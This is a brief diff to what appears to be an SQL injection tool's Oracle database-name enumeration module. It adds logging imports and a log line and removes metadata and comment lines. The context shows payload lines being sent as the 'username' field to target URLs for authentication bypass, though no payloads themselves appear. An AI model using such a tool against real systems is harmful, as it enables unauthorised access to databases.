@@ -27,19 +27,11 @@ from lib.result.Results import SQLJNG_result_report
 from lib.result.Results import safe_SQLJNG_result
 from Exceptions.exceptions import SQLJNGStackRangeError
 from lib.Prints.prints import print_function_yellow as printy
+from lib.Attacktype.Attacks import OracleAttacks
+from logger.sqljlog import logger as sqljlog
 
 
-try:
-    __priority__ = PRIORITY.HIGH
-    __harmful__ = HARMFULL.MEDIUM
 
-except:
-    try:
-        del __priority__
-        del __harmful__
-    
-    except:
-        pass
     
 
 
@@ -47,9 +39,7 @@ except:
 
 import logging
 
-############################################################################
 attack_type = "authentication bypass SQL injection"
-#############################################################################
 
 """
 Oracle Database Name Enumeration Script
@@ -121,6 +111,7 @@ async def DB_name_ATTACK(urls):
                 logger.info("Payload is ready to be sent.")
 
                 if ask.lower() == "y":
+                    sqljlog.info(f"Testing:{OracleAttacks.DATABASE_NAME.value}")
                     for line in sorted_payload.split("\n"): 
                         params = { 
                             "username": line,
